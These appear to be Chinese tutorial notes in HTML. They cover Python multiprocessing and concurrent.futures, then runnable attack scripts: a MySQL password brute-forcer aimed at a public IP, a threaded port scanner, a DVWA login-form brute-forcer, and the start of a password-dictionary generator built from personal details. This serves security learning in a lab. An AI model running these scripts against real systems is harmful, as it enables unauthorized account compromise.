看到了多个进程都在使用CPU，这是真并行，而且进程库几乎没有什么学习难度<br>
</p>

<p>
注意：多进程代码一定要放在 <code>__name__ =</code> "<span class="underline"><span class="underline">main</span></span>"= 下面执行。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21517;&#31216; &#35828;&#26126;
pid &#36827;&#31243;id
exitcode &#36827;&#31243;&#30340;&#36864;&#20986;&#29366;&#24577;&#30721;
<span style="color: #0000ff;">terminate</span>() &#32456;&#27490;&#25351;&#23450;&#30340;&#36827;&#31243;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d3980524-651a-4af7-b68b-dcad64a624d1" class="outline-5">
<h5 id="h:d3980524-651a-4af7-b68b-dcad64a624d1">进程间同步</h5>
<div class="outline-text-5" id="text-h:d3980524-651a-4af7-b68b-dcad64a624d1">
<p>
Python在进程间同步提供了和线程同步一样的类，使用的方法一样，使用的效果也类似。<br>
</p>

<p>
不过，进程间代价要高于线程间，而且系统底层实现是不同的，只不过Python屏蔽了这些不同之处，让用户简单使用多进程。<br>
</p>

<p>
multiprocessing还提供共享内存、服务器进程来共享数据，还提供了用于进程间通讯的Queue队列、Pipe管道。<br>
</p>
</div>
</div>
<div id="outline-container-h:8d965a80-6376-4cd9-8bc8-08d36bd6dc5b" class="outline-5">
<h5 id="h:8d965a80-6376-4cd9-8bc8-08d36bd6dc5b">多进程、多线程的选择</h5>
<div class="outline-text-5" id="text-h:8d965a80-6376-4cd9-8bc8-08d36bd6dc5b">
<p>
1、CPU密集型<br>
CPython中使用到了GIL，多线程的时候锁相互竞争，且多核优势不能发挥，选用Python多进程效率更高。<br>
</p>

<p>
2、IO密集型<br>
在Python中适合是用多线程，可以减少多进程间IO的序列化开销。且在IO等待的时候，切换到其他线程继续执行，效率不错。<br>
</p>

<p>
<b>应用</b><br>
</p>

<p>
请求/应答模型：WEB应用中常见的处理模型<br>
</p>

<p>
master启动多个worker工作进程，一般和CPU数目相同。发挥多核优势。<br>
worker工作进程中，往往需要操作网络IO和磁盘IO，启动多线程，提高并发处理能⼒。worker处理用户的请求，<br>
往往需要等待数据，处理完请求还要通过网络IO返回响应。<br>
这就是nginx工作模式。<br>
</p>
</div>
</div>
<div id="outline-container-h:c410f37f-5d6b-499f-a741-6517c9010c2b" class="outline-5">
<h5 id="h:c410f37f-5d6b-499f-a741-6517c9010c2b">concurrent.futures包</h5>
<div class="outline-text-5" id="text-h:c410f37f-5d6b-499f-a741-6517c9010c2b">
<p>
3.2版本引入的模块。<br>
</p>

<p>
异步并行任务编程模块，提供一个高级的异步可执行的便利接口。<br>
</p>

<p>
提供了2个池执行器：<br>
</p>

<ul class="org-ul">
<li>ThreadPoolExecutor 异步调用的线程池的Executor<br></li>
<li>ProcessPoolExecutor 异步调用的进程池的Executor<br></li>
</ul>

<p>
<b>ThreadPoolExecutor对象</b><br>
</p>

<p>
首先需要定义一个池的执行器对象，Executor类的子类实例。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26041;&#27861; &#21547;&#20041;
<span style="color: #0000ff;">ThreadPoolExecutor</span>(<span style="color: #a0522d;">max_workers</span>=1)
&#27744;&#20013;&#33267;&#22810;&#21019;&#24314;max_workers&#20010;&#32447;&#31243;&#30340;&#27744;&#26469;&#21516;&#26102;&#24322;&#27493;&#25191;&#34892;&#65292;&#36820;&#22238;Executor&#23454;&#20363;
&#25903;&#25345;&#19978;&#19979;&#25991;&#65292;&#36827;&#20837;&#26102;&#36820;&#22238;&#33258;&#24049;&#65292;&#36864;&#20986;&#26102;&#35843;&#29992;
<span style="color: #0000ff;">shutdown</span>(<span style="color: #a0522d;">wait</span>=True)

<span style="color: #0000ff;">submit</span>(fn, *args, **kwargs)
&#25552;&#20132;&#25191;&#34892;&#30340;&#20989;&#25968;&#21450;&#20854;&#21442;&#25968;&#65292;&#22914;&#26377;&#31354;&#38386;&#24320;&#21551;daemon&#32447;&#31243;&#65292;&#36820;&#22238;Future&#31867;&#30340;&#23454;&#20363;

<span style="color: #0000ff;">shutdown</span>(<span style="color: #a0522d;">wait</span>=True) &#28165;&#29702;&#27744;&#65292;wait&#34920;&#31034;&#26159;&#21542;&#31561;&#24453;&#21040;&#20219;&#21153;&#32447;&#31243;&#23436;&#25104;
</pre>
</div>

<p>
Future类<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26041;&#27861; &#21547;&#20041;
<span style="color: #a020f0;">done</span>() &#22914;&#26524;&#35843;&#29992;&#34987;&#25104;&#21151;&#30340;&#21462;&#28040;&#25110;&#32773;&#25191;&#34892;&#23436;&#25104;&#65292;&#36820;&#22238;True
<span style="color: #0000ff;">cancelled</span>() &#22914;&#26524;&#35843;&#29992;&#34987;&#25104;&#21151;&#30340;&#21462;&#28040;&#65292;&#36820;&#22238;True
<span style="color: #0000ff;">running</span>() &#22914;&#26524;&#27491;&#22312;&#36816;&#34892;&#19988;&#19981;&#33021;&#34987;&#21462;&#28040;&#65292;&#36820;&#22238;True
<span style="color: #0000ff;">cancel</span>() &#23581;&#35797;&#21462;&#28040;&#35843;&#29992;&#12290;&#22914;&#26524;&#24050;&#32463;&#25191;&#34892;&#19988;&#19981;&#33021;&#21462;&#28040;&#36820;&#22238;False&#65292;&#21542;&#21017;&#36820;&#22238;True
<span style="color: #0000ff;">result</span>(<span style="color: #a0522d;">timeout</span>=None) &#21462;&#36820;&#22238;&#30340;&#32467;&#26524;&#65292;timeout&#20026;None&#65292;&#19968;&#30452;&#31561;&#24453;&#36820;&#22238;&#65307;timeout&#35774;&#32622;&#21040;&#26399;&#65292;&#25243;&#20986;concurrent.futures.TimeoutError &#24322;&#24120;
<span style="color: #0000ff;">exception</span>(<span style="color: #a0522d;">timeout</span>=None) &#21462;&#36820;&#22238;&#30340;&#24322;&#24120;&#65292;timeout&#20026;None&#65292;&#19968;&#30452;&#31561;&#24453;&#36820;&#22238;&#65307;timeout&#35774;&#32622;&#21040;&#26399;&#65292;&#25243;&#20986;concurrent.futures.TimeoutError &#24322;&#24120;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> concurrent.futures <span style="color: #a020f0;">import</span> ThreadPoolExecutor, wait
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">import</span> logging

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">"%(asctime)s [%(processName)s %(threadName)s] %(message)s"</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">calc</span>(base):
  <span style="color: #483d8b;">sum</span> = base
  <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(100000000):
    <span style="color: #483d8b;">sum</span> += 1
  logging.info(<span style="color: #483d8b;">sum</span>)
  <span style="color: #a020f0;">return</span> <span style="color: #483d8b;">sum</span>

<span style="color: #a0522d;">start</span> = datetime.datetime.now()
<span style="color: #a0522d;">executor</span> = ThreadPoolExecutor(3)
<span style="color: #a020f0;">with</span> executor: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;shutdown&#38459;&#22622;</span>
  <span style="color: #a0522d;">fs</span> = []
  <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(3):
    <span style="color: #a0522d;">future</span> = executor.submit(calc, i*100)
    fs.append(future)

  <span style="color: #b22222;">#</span><span style="color: #b22222;">wait(fs) # &#38459;&#22622;</span>
  <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span> * 30)
<span style="color: #a020f0;">for</span> f <span style="color: #a020f0;">in</span> fs:
  <span style="color: #483d8b;">print</span>(f, f.done(), f.result()) <span style="color: #b22222;"># </span><span style="color: #b22222;">done&#19981;&#38459;&#22622;&#65292;result&#38459;&#22622;</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span> * 30)
<span style="color: #a0522d;">delta</span> = (datetime.datetime.now() - start).total_seconds()
<span style="color: #483d8b;">print</span>(delta)
</pre>
</div>

<p>
<b>ProcessPoolExecutor对象</b><br>
</p>

<p>
方法一样。就是使用多进程完成。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> concurrent.futures <span style="color: #a020f0;">import</span> ProcessPoolExecutor, wait
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">import</span> logging

<span style="color: #a0522d;">FORMAT</span> = <span style="color: #8b2252;">"%(asctime)s [%(processName)s %(threadName)s] %(message)s"</span>
logging.basicConfig(<span style="color: #483d8b;">format</span>=FORMAT, level=logging.INFO)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">calc</span>(base):
  <span style="color: #483d8b;">sum</span> = base
  <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(100000000):
    <span style="color: #483d8b;">sum</span> += 1
  logging.info(<span style="color: #483d8b;">sum</span>)
  <span style="color: #a020f0;">return</span> <span style="color: #483d8b;">sum</span>

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
  <span style="color: #a0522d;">start</span> = datetime.datetime.now()
  <span style="color: #a0522d;">executor</span> = ProcessPoolExecutor(3)
  <span style="color: #a020f0;">with</span> executor: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;shutdown&#38459;&#22622;</span>
    <span style="color: #a0522d;">fs</span> = []
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(3):
      <span style="color: #a0522d;">future</span> = executor.submit(calc, i*100)
      fs.append(future)
    <span style="color: #b22222;">#</span><span style="color: #b22222;">wait(fs) # &#38459;&#22622;</span>
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span> * 30)
  <span style="color: #a020f0;">for</span> f <span style="color: #a020f0;">in</span> fs:
    <span style="color: #483d8b;">print</span>(f, f.done(), f.result()) <span style="color: #b22222;"># </span><span style="color: #b22222;">done&#19981;&#38459;&#22622;&#65292;result&#38459;&#22622;</span>
  <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span> * 30)
  <span style="color: #a0522d;">delta</span> = (datetime.datetime.now() - start).total_seconds()
  <span style="color: #483d8b;">print</span>(delta)
</pre>
</div>

<p>
<b>总结</b><br>
</p>

<p>
该库统一了线程池、进程池调用，简化了编程。<br>
是Python简单的思想哲学的体现。<br>
</p>

<p>
唯一的缺点：无法设置线程名称。但这都不值一提。<br>
</p>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:9d46125f-2d0a-4ae0-8ad8-3c6945257fcb" class="outline-2">
<h2 id="h:9d46125f-2d0a-4ae0-8ad8-3c6945257fcb">扫描与爆破</h2>
<div class="outline-text-2" id="text-h:9d46125f-2d0a-4ae0-8ad8-3c6945257fcb">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>python 协议暴力破解框架<br></li>
<li>python MySQL 暴力破解<br></li>
<li>http 表单暴力破解<br></li>
<li>python 爆破-sqlserver<br></li>
<li>python 端口扫描程序<br></li>
</ul>
</div>
<div id="outline-container-h:5ecd84fc-d7ed-4840-bbc2-8d717839b4a4" class="outline-3">
<h3 id="h:5ecd84fc-d7ed-4840-bbc2-8d717839b4a4">python Mysql&amp;SqlServer 暴力破解</h3>
<div class="outline-text-3" id="text-h:5ecd84fc-d7ed-4840-bbc2-8d717839b4a4">
<p>
首先使用 dvwa 数据库，并新增一个用户<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; CREATE USER <span style="color: #8b2252;">'Cici'</span>@<span style="color: #8b2252;">'%'</span> IDENTIFIED BY <span style="color: #8b2252;">'123456'</span>;
</pre>
</div>

<p>
使用pymysql连接数据库，并进行暴力破解<br>
安装pymysql<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">pip install pymysql
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> pymysql

<span style="color: #a0522d;">password_list</span> = [
    <span style="color: #8b2252;">"pass1"</span>,
    <span style="color: #8b2252;">"pass2"</span>,
    <span style="color: #8b2252;">"pass3"</span>,
    <span style="color: #8b2252;">"pass4"</span>,
    <span style="color: #8b2252;">"pass5"</span>,
    <span style="color: #8b2252;">"pass6"</span>,
    <span style="color: #8b2252;">"pass7"</span>,
    <span style="color: #8b2252;">"pass8"</span>,
    <span style="color: #8b2252;">"pass9"</span>,
    <span style="color: #8b2252;">"pass10"</span>,
    <span style="color: #8b2252;">"pass11"</span>,
    <span style="color: #8b2252;">"pass12"</span>,
    <span style="color: #8b2252;">"123456"</span>
]

<span style="color: #483d8b;">dict</span> = {<span style="color: #8b2252;">'user'</span>: <span style="color: #8b2252;">'Cici'</span>,
        <span style="color: #8b2252;">'host'</span>: <span style="color: #8b2252;">'124.222.171.19'</span>,
        <span style="color: #b22222;">#</span><span style="color: #b22222;">'password': 'root',</span>
        <span style="color: #8b2252;">'database'</span>: <span style="color: #8b2252;">'dvwa'</span>,
        <span style="color: #8b2252;">'port'</span>: 33060}

<span style="color: #a020f0;">for</span> password <span style="color: #a020f0;">in</span> password_list:
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">data</span> = pymysql.connect(password=password, 
                               **<span style="color: #483d8b;">dict</span>)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[+]Find Password is: %s !!!!!!!"</span> % password)
        <span style="color: #a020f0;">break</span>
    <span style="color: #a020f0;">except</span> pymysql.err.OperationalError <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[-]Password error: %s"</span> % password)
</pre>
</div>

<p>
也可以读取文件中的密码列表进行暴力破解<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> pymysql

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">brute_force</span>(password_list):
    <span style="color: #a020f0;">for</span> password <span style="color: #a020f0;">in</span> password_list:
        <span style="color: #a0522d;">password</span> = password.strip()
        <span style="color: #a020f0;">try</span>:
            pymysql.connect(host=<span style="color: #8b2252;">"127.0.0.1"</span>, port=33060, user=<span style="color: #8b2252;">"Cici"</span>,
                            password=password)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[+]Find Password is: %s !!!!!!!"</span> % password)
            <span style="color: #a020f0;">break</span>
        <span style="color: #a020f0;">except</span> pymysql.err.OperationalError <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[-]Password error: %s"</span> % password)

<span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"mysql_pass.txt"</span>, <span style="color: #8b2252;">"r"</span>) <span style="color: #a020f0;">as</span> f:
    brute_force(f.readlines())
</pre>
</div>
</div>
</div>
<div id="outline-container-h:8516f423-4baf-4efc-9e67-b9284549373c" class="outline-3">
<h3 id="h:8516f423-4baf-4efc-9e67-b9284549373c">python 端口扫描</h3>
<div class="outline-text-3" id="text-h:8516f423-4baf-4efc-9e67-b9284549373c">
<p>
使用线程池进行端口扫描，并记录扫描时间<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> socket
<span style="color: #a020f0;">from</span> concurrent.futures <span style="color: #a020f0;">import</span> ThreadPoolExecutor, wait
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">Cici_main</span>():
    <span style="color: #a0522d;">target_ip</span> = <span style="color: #483d8b;">input</span>(<span style="color: #8b2252;">"IP:"</span>)
    <span style="color: #a0522d;">start_time</span> = time.time()
    <span style="color: #a0522d;">start_time_format</span> = time.ctime()
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[*] Start port scan at %s"</span> % start_time_format)
    <span style="color: #a0522d;">future</span> = [pool.submit(port_scan, target_ip, port) <span style="color: #a020f0;">for</span> port <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(0, 1000)]
    wait(future) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#31561;&#24453;&#25152;&#26377;&#32447;&#31243;&#23436;&#25104;</span>
    pool.shutdown()
    <span style="color: #a0522d;">end_time</span> = time.time()
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[*] &#25195;&#25551;&#32467;&#26463;&#65292;&#20849;&#35745;&#25195;&#25551;&#26102;&#38388;: %.2f s"</span> % (end_time - start_time))

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">port_scan</span>(target, port):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">client</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;socket&#23545;&#35937;</span>
        client.connect((target, port)) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24314;&#31435;TCP&#36830;&#25509;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[*] %s: %d &#31471;&#21475;&#24320;&#25918;"</span> % (target, port))
        client.close()
    <span style="color: #a020f0;">except</span>:
        <span style="color: #a020f0;">pass</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25429;&#33719;&#24322;&#24120;</span>

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">"__main__"</span>:
    <span style="color: #a0522d;">pool</span> = ThreadPoolExecutor(max_workers=20)
    Cici_main()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:fe6c8962-a0d7-4780-9206-fbbd69af34ee" class="outline-3">
<h3 id="h:fe6c8962-a0d7-4780-9206-fbbd69af34ee">HTTP表单暴力破解</h3>
<div class="outline-text-3" id="text-h:fe6c8962-a0d7-4780-9206-fbbd69af34ee">
<p>
首先先写一个用来爆破dvwa的函数<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> requests
<span style="color: #a020f0;">import</span> operator

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">brute_force</span>(user, password):
    <span style="color: #a0522d;">proxy</span> = {<span style="color: #8b2252;">"http"</span>: <span style="color: #8b2252;">"127.0.0.1:8081"</span>}
    <span style="color: #b22222;"># </span><span style="color: #b22222;">DVWA &#30331;&#38470;&#25509;&#21475;</span>
    <span style="color: #a0522d;">url</span> = <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/brute/?username=%s&amp;password=%s&amp;Login=Login"</span> % (user, password)
    <span style="color: #a0522d;">user_agent</span> = <span style="color: #8b2252;">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "</span> \
        <span style="color: #8b2252;">"Chrome/101.0.4951.41 Safari/537.36"</span>
    <span style="color: #a0522d;">header</span> = {<span style="color: #8b2252;">"User-Agent"</span>: user_agent, <span style="color: #8b2252;">"Content-Type"</span>: <span style="color: #8b2252;">"application/x-www-form-urlencoded"</span>, <span style="color: #8b2252;">"Cookie"</span>: <span style="color: #8b2252;">"PHPSESSID=q0jjc3mnedod1gsqcd2tt53sg4; security=low"</span>}
    <span style="color: #a0522d;">response</span> = requests.get(url, headers=header)
    <span style="color: #a0522d;">data</span> = response.text
    <span style="color: #a020f0;">if</span> operator.contains(data, <span style="color: #8b2252;">"Welcome to the password protected area"</span>):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[+] Login Success, Password is %s !!!"</span> % password)
    <span style="color: #a020f0;">else</span>:
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[-] Login Error"</span>)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    brute_force(<span style="color: #8b2252;">"gordonb"</span>, <span style="color: #8b2252;">"abc123"</span>)
</pre>
</div>

<p>
之后读取用户名、密码文件，使用多线程进行爆破<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> requests
<span style="color: #a020f0;">import</span> operator
<span style="color: #a020f0;">from</span> concurrent.futures <span style="color: #a020f0;">import</span> ThreadPoolExecutor, wait

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">brute_force</span>(user, password):
    <span style="color: #a0522d;">proxy</span> = {<span style="color: #8b2252;">"http"</span>: <span style="color: #8b2252;">"127.0.0.1:8081"</span>}
    <span style="color: #b22222;"># </span><span style="color: #b22222;">DVWA &#30331;&#38470;&#25509;&#21475;</span>
    <span style="color: #a0522d;">url</span> = <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/brute/?username=%s&amp;password=%s&amp;Login=Login"</span> % (user, password)
    <span style="color: #a0522d;">user_agent</span> = <span style="color: #8b2252;">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "</span> \
        <span style="color: #8b2252;">"Chrome/101.0.4951.41 Safari/537.36"</span>
    <span style="color: #a0522d;">header</span> = {<span style="color: #8b2252;">"User-Agent"</span>: user_agent, <span style="color: #8b2252;">"Content-Type"</span>: <span style="color: #8b2252;">"application/x-www-form-urlencoded"</span>, <span style="color: #8b2252;">"Cookie"</span>: <span style="color: #8b2252;">"PHPSESSID=q0jjc3mnedod1gsqcd2tt53sg4; security=low"</span>}
    <span style="color: #a0522d;">response</span> = requests.get(url, headers=header)
    <span style="color: #a0522d;">data</span> = response.text
    <span style="color: #a020f0;">if</span> operator.contains(data, <span style="color: #8b2252;">"Welcome to the password protected area"</span>):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[+] Login Success, Password is %s !!!"</span> % password)
    <span style="color: #a020f0;">else</span>:
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[-] Login Error"</span>)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">brute_force_read_file</span>():
    <span style="color: #a0522d;">brute_list</span> = []
    <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"username_list.txt"</span>, <span style="color: #8b2252;">"r"</span>) <span style="color: #a020f0;">as</span> user_file:
        <span style="color: #a020f0;">for</span> user <span style="color: #a020f0;">in</span> user_file:
            <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"password_list.txt"</span>, <span style="color: #8b2252;">"r"</span>) <span style="color: #a020f0;">as</span> pass_file:
                <span style="color: #a020f0;">for</span> password <span style="color: #a020f0;">in</span> pass_file:
                    <span style="color: #a0522d;">future</span> = pool.submit(brute_force, user.strip(), password.strip())
                    brute_list.append(future)
    wait(brute_list)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    <span style="color: #a0522d;">pool</span> = ThreadPoolExecutor(max_workers=20)
    brute_force_read_file()
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:b75269ab-df1e-4ef0-948d-d3fb1319c8e2" class="outline-2">
<h2 id="h:b75269ab-df1e-4ef0-948d-d3fb1319c8e2">pyhon 信息收集工具编写</h2>
<div class="outline-text-2" id="text-h:b75269ab-df1e-4ef0-948d-d3fb1319c8e2">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>密码字典生成器编写<br></li>
<li>子域名扫描程序<br></li>
<li>web目录扫描程序<br></li>
<li>指纹识别工具开发<br></li>
<li>C段web服务扫描<br></li>
</ul>
</div>
<div id="outline-container-h:8684a553-ec5f-4bea-9251-9f9aa4d09a17" class="outline-3">
<h3 id="h:8684a553-ec5f-4bea-9251-9f9aa4d09a17">密码字典生成器编写</h3>
<div class="outline-text-3" id="text-h:8684a553-ec5f-4bea-9251-9f9aa4d09a17">
<p>
思路：<br>
</p>
<ol class="org-ol">
<li>收集相关信息<br></li>
<li>汉字转拼音<br></li>
<li>不同的信息抽取方式<br></li>
<li>关键信息组合<br></li>
</ol>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">coding:utf-8</span>

<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">from</span> pypinyin <span style="color: #a020f0;">import</span> lazy_pinyin

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Person</span>:
    <span style="color: #a0522d;">NAME</span> = <span style="color: #8b2252;">"Cici"</span>
    <span style="color: #a0522d;">PHONE</span> = [<span style="color: #8b2252;">"13512345678"</span>, ]
    <span style="color: #a0522d;">CARD</span> = <span style="color: #8b2252;">"220281198309243953"</span>
    <span style="color: #a0522d;">BIRTHDAY</span> = (<span style="color: #8b2252;">"1983"</span>, <span style="color: #8b2252;">"09"</span>, <span style="color: #8b2252;">"24"</span>)
    <span style="color: #a0522d;">HOMETOWN</span> = (<span style="color: #8b2252;">"&#27827;&#21335;"</span>, <span style="color: #8b2252;">"&#37073;&#24030;"</span>, <span style="color: #8b2252;">"&#39640;&#26032;&#21306;"</span>)
    <span style="color: #a0522d;">PLACE</span> = [(<span style="color: #8b2252;">"&#21271;&#20140;"</span>, <span style="color: #8b2252;">"&#26124;&#24179;"</span>, <span style="color: #8b2252;">"&#28165;&#27827;"</span>), ]
    <span style="color: #a0522d;">QQ</span> = [<span style="color: #8b2252;">"18746370"</span>, ]
    <span style="color: #a0522d;">COMPANY</span> = [(<span style="color: #8b2252;">"Key"</span>, <span style="color: #8b2252;">"Cici"</span>), ]
    <span style="color: #a0522d;">SCHOOL</span> = [(<span style="color: #8b2252;">"&#28165;&#21326;&#22823;&#23398;"</span>, <span style="color: #8b2252;">"&#28165;&#21326;"</span>, <span style="color: #8b2252;">"tsinghua"</span>)]
    <span style="color: #a0522d;">ACCOUNT</span> = [<span style="color: #8b2252;">"cici"</span>, ]
    <span style="color: #a0522d;">PASSWORD</span> = [<span style="color: #8b2252;">"old_password"</span>, ]

<span style="color: #a0522d;">Delimiters</span> = [<span style="color: #8b2252;">""</span>, <span style="color: #8b2252;">"-"</span>, <span style="color: #8b2252;">"."</span>, <span style="color: #8b2252;">"|"</span>, <span style="color: #8b2252;">"_"</span>, <span style="color: #8b2252;">"+"</span>, <span style="color: #8b2252;">"#"</span>, <span style="color: #8b2252;">"@"</span>]
<span style="color: #a0522d;">Prefix</span> = [<span style="color: #8b2252;">""</span>, ]
<span style="color: #a0522d;">Suffix</span> = [<span style="color: #8b2252;">""</span>, <span style="color: #8b2252;">"123"</span>, <span style="color: #8b2252;">"@"</span>, <span style="color: #8b2252;">"abc"</span>, <span style="color: #8b2252;">"."</span>, <span style="color: #8b2252;">"123."</span>, <span style="color: #8b2252;">"!!!"</span>, ]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#25340;&#38899;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_pinyin</span>(word):
    <span style="color: #a0522d;">pinyin</span> = <span style="color: #8b2252;">""</span>
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> lazy_pinyin(word):
        <span style="color: #a0522d;">pinyin</span> = pinyin + <span style="color: #8b2252;">''</span>.join(i)
    <span style="color: #a020f0;">return</span> pinyin

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#32553;&#20889;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_abbreviation</span>(word):
    <span style="color: #a0522d;">result</span> = <span style="color: #8b2252;">""</span>
    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> word:
        <span style="color: #a0522d;">result</span> += get_pinyin(i)[0]
    <span style="color: #a020f0;">return</span> result

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#20840;&#25340;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_full_pinyin</span>(word):
    <span style="color: #a020f0;">return</span> get_pinyin(word)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39318;&#23383;&#27597;&#22823;&#20889;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_title</span>(word):
    <span style="color: #a020f0;">return</span> word.title()

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_name_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#22995;&#21517;&#20840;&#25340;</span>
    result.append(get_pinyin(person.NAME))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462; &#22995; &#20840;&#25340;</span>
    result.append(get_pinyin(person.NAME[0]))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462; &#21517; &#20840;&#25340;</span>
    result.append(get_pinyin(person.NAME[1:]))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#39318;&#23383;&#27597;&#22823;&#20889;&#22995;&#21517;&#20840;&#25340;</span>
    result.append(get_title(get_pinyin(person.NAME)))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#39318;&#23383;&#27597;&#22823;&#20889; &#22995; &#20840;&#25340;</span>
    result.append(get_title(get_pinyin(person.NAME[0])))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#39318;&#23383;&#27597;&#22823;&#20889; &#21517; &#20840;&#25340;</span>
    result.append(get_title(get_pinyin(person.NAME[1:])))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#32553;&#20889;&#22995;&#21517;&#25340;&#38899;(&#21482;&#26377;&#39318;&#23383;&#27597;)</span>
    result.append(get_abbreviation(person.NAME))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#32553;&#20889; &#22995; &#25340;&#38899;</span>
